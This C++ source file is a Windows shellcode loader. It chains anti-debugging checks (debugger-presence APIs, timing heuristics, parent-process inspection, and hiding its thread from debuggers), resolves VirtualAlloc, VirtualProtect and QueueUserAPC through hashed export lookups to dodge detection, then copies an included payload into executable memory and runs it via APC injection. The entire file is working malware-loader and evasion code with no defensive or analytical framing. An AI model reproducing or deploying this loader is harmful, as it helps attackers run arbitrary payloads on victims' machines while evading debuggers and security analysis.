#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include <timeapi.h>

#include "base.cpp"

/*
    All The Anti-Debugging Techniques I Implemented Off the Rip.
    They all return true if the process is being debugged, false if not.
*/

// Function to check if the process is being debugged using IsDebuggerPresent.
bool static isDebuggerPresentBasic() {
    return IsDebuggerPresent();
}

// -----------------------------------------------------------------------------------------------


// Function to check if the process is being debugged by another process using CheckRemoteDebuggerPresent.
bool static isDebuggerPresentRemote() {
    BOOL bDebuggerPresent = FALSE;
    return (CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebuggerPresent) && bDebuggerPresent);
}

// -----------------------------------------------------------------------------------------------

// Function to check if the process is being debugged by another process using a variety of time heuristics.

bool static IsDebuggedTimeHeuristics(unsigned __int64 qwNativeElapsed, DWORD dwNativeElapsedTick, DWORD64 qwNativeElapsedQuery) {
    SYSTEMTIME stStart, stEnd;
    FILETIME ftStart, ftEnd;
    ULARGE_INTEGER uiStart, uiEnd;
    LARGE_INTEGER liStart, liEnd;

    // GetSystemTime method detection
    GetSystemTime(&stStart);
    
    // Simulate work by sleeping
    Sleep(200);

    GetSystemTime(&stEnd);

    if (!SystemTimeToFileTime(&stStart, &ftStart)) {
        return false;
    }
    if (!SystemTimeToFileTime(&stEnd, &ftEnd)) {
        return false;
    }

    uiStart.LowPart = ftStart.dwLowDateTime;
    uiStart.HighPart = ftStart.dwHighDateTime;
    uiEnd.LowPart = ftEnd.dwLowDateTime;
    uiEnd.HighPart = ftEnd.dwHighDateTime;

    if ((ULONGLONG)(uiEnd.QuadPart - uiStart.QuadPart) > qwNativeElapsed) return true;

    // GetTickCount64 method detection.
    ULONGLONG dwStartTick = GetTickCount64();

    // Simulate work by sleeping
    Sleep(200);

    if ((GetTickCount64() - dwStartTick) > dwNativeElapsedTick) return true;

    // QueryPerformanceCounter method detection.
    QueryPerformanceCounter(&liStart);
    
    // Simulate work by sleeping
    Sleep(200);
    
    QueryPerformanceCounter(&liEnd);
    if ((ULONGLONG)(liEnd.QuadPart - liStart.QuadPart) > qwNativeElapsedQuery) return true;

    return false;
}

// -----------------------------------------------------------------------------------------------

#define NtCurrentThread ((HANDLE)-2)  // Define NtCurrentThread as the current thread handle.

// Define the function prototype for NtSetInformationThread from ntdll.dll.
typedef NTSTATUS (NTAPI* pNtSetInformationThread)(
    HANDLE ThreadHandle, 
    _THREAD_INFORMATION_CLASS ThreadInformationClass,
    PVOID ThreadInformation, 
    ULONG ThreadInformationLength
);

// Function to hide the current thread from the debugger.
bool static HideThreadFromDebugger() {
    // Load ntdll.dll dynamically.
    HMODULE hNtDll = GetModuleHandle(_T("ntdll.dll"));
    if (hNtDll == NULL) return false;

    // Get the address of the NtSetInformationThread function.
    pNtSetInformationThread NtSetInformationThread = 
        (pNtSetInformationThread)GetProcAddress(hNtDll, "NtSetInformationThread");
    if (NtSetInformationThread == NULL) return false;

    NTSTATUS status = NtSetInformationThread(
        NtCurrentThread, 
        (THREAD_INFORMATION_CLASS)0x11, 
        NULL, 
        0);
    return status >= 0;
}

// -----------------------------------------------------------------------------------------------

// Advanced anti-debugging check using NtQueryInformationProcess to detect a debugger.
bool static isDebuggerPresentNtQuery() {
    typedef struct _PROCESS_BASIC_INFORMATION {
        ULONG Reserved;
        ULONG PebBaseAddress;
        ULONG AffinityMask;
        ULONG BasePriority;
        ULONG UniqueProcessId;
        ULONG InheritedFromUniqueProcessId;
    } PROCESS_BASIC_INFORMATION;
    
    typedef enum _PROCESSINFOCLASS {
        ProcessBasicInformation = 0  // Enum value for ProcessBasicInformation.
    } PROCESSINFOCLASS;

    // Define the function prototype for NtQueryInformationProcess.
    typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    
    // Get the address of NtQueryInformationProcess from ntdll.dll.
    HMODULE nHandle = GetModuleHandle(L"ntdll.dll");
    if (nHandle == 0) return false;

    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(nHandle, "NtQueryInformationProcess");
    if (NtQueryInformationProcess == NULL) {
        return false;
    }
  
    PROCESS_BASIC_INFORMATION pbi;
    ULONG len = 0;
    NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &len);
    if (status != 0) return false;

    // Check if the process is running under a debugger by examining the inherited process ID.
    // Return true if the inherited process ID is non-zero (indicating a debugger).
    return pbi.InheritedFromUniqueProcessId != 0;
}

// -----------------------------------------------------------------------------------------------

bool static AntiDebug() {

    // Set the thresholds for each detection method
    unsigned __int64 qwNativeElapsed = 5000000; // 5 seconds in 100-nanosecond intervals
    DWORD dwNativeElapsedTick = 1000;    // Threshold for GetTickCount/timeGetTime in milliseconds
    unsigned __int64 qwNativeElapsedQuery = 5000000; // Threshold for QueryPerformanceCounter in high-resolution intervals

    // Check for debugger presence using a variety of time heuristics.
    if (IsDebuggedTimeHeuristics(qwNativeElapsed, dwNativeElapsedTick, qwNativeElapsedQuery)) {
        exit(-1); // If the delay indicates a debugger, exit the application.
    }

    // Check for basic debugger presence using IsDebuggerPresent function.
    if (isDebuggerPresentBasic()) {
        exit(-1);  // If a debugger is detected, exit the application.
    }

    // Check for remote debugger presence using CheckRemoteDebuggerPresent function.
    if (isDebuggerPresentRemote()) {
        exit(-1);  // If a remote debugger is detected, exit the application.
    }

    // Check for debugger presence using NtQueryInformationProcess function.
    if (isDebuggerPresentNtQuery()) {
        exit(-1);  // If a debugger is detected, exit the application.
    }

    // Hide the current thread from the debugger using NtSetInformationThread.
    if (!HideThreadFromDebugger()) {
        return false;
    }

    return true;  // Return true if no debugger is detected and thread is hidden.
}


/*

    Structural Code Necessary for Runtime

*/

// Define FNV-1a (Fowler-Noll-Vo) hashing function for API hashing.
unsigned int hash_api(const char* str) {
    unsigned int hash = 2166136261U;
    while (*str) {
        hash ^= (unsigned int)(*str++);
        hash *= 16777619;
    }
    return hash;
}

int main() {

    // Call the AntiDebug function to check for debugging attempts.
    if (!AntiDebug()) {
        return -1;
    }

    // Define standard variable stubs.
    HANDLE hThread = NULL;
    DWORD dwThreadId = 0;  // Should be 0, not NULL
    DWORD dwOldProtection = 0;

    // Grab a module handle for kernel32.dll.
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    if (!kernel32) return 1;

    // Resolve necessary WinAPI functions.
    typedef LPVOID(WINAPI* VirtualAlloc_t)(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
    typedef DWORD(WINAPI* QueueUserAPC_t)(PAPCFUNC, HANDLE, ULONG_PTR);

    VirtualAlloc_t pVirtualAlloc = NULL;
    VirtualProtect_t pVirtualProtect = NULL;
    QueueUserAPC_t pQueueUserAPC = NULL;

    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)kernel32;
    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)kernel32 + dosHeader->e_lfanew);
    IMAGE_EXPORT_DIRECTORY* exportDirectory = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)kernel32 + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD* nameRVA = (DWORD*)((BYTE*)kernel32 + exportDirectory->AddressOfNames);
    DWORD* functionRVA = (DWORD*)((BYTE*)kernel32 + exportDirectory->AddressOfFunctions);
    WORD* ordinals = (WORD*)((BYTE*)kernel32 + exportDirectory->AddressOfNameOrdinals);

    for (unsigned int i = 0; i < exportDirectory->NumberOfNames; i++) {
        const char* functionName = (const char*)((BYTE*)kernel32 + nameRVA[i]);
        if (hash_api(functionName) == 0x3285501) {  // Adjust hash values if necessary
            pVirtualAlloc = (VirtualAlloc_t)((BYTE*)kernel32 + functionRVA[ordinals[i]]);
        }
        if (hash_api(functionName) == 0x820621F3) {
            pVirtualProtect = (VirtualProtect_t)((BYTE*)kernel32 + functionRVA[ordinals[i]]);
        }
        if (hash_api(functionName) == 0x890BB4FB) {
            pQueueUserAPC = (QueueUserAPC_t)((BYTE*)kernel32 + functionRVA[ordinals[i]]);
        }
    }

    if (!pVirtualAlloc || !pVirtualProtect || !pQueueUserAPC) return 1;

    // Create the thread running "an alertable function".
    hThread = CreateThread(NULL, 0, [](LPVOID lpParam) -> DWORD {
        HANDLE x = CreateEvent(NULL, FALSE, FALSE, NULL);
        HANDLE y = CreateEvent(NULL, FALSE, FALSE, NULL);
        if (x && y) {
            SignalObjectAndWait(x, y, INFINITE, TRUE);
            CloseHandle(x);
            CloseHandle(y);
        }
        return 0;
    }, NULL, 0, &dwThreadId);

    if (hThread == NULL) return 1;

    // Allocate memory for the payload.
    PVOID pAddress = pVirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) return 1;

    // Write the shellcode to the allocated memory.
    memcpy(pAddress, buf, sizeof(buf));

    // Change memory protection to executable.
    if (!pVirtualProtect(pAddress, sizeof(buf), PAGE_EXECUTE_READWRITE, &dwOldProtection)) return 1;

    // Queue the user via APC.
    if (!pQueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) return 1;

    // Wait for the thread to alert.
    WaitForSingleObject(hThread, INFINITE);

    return 0;
}
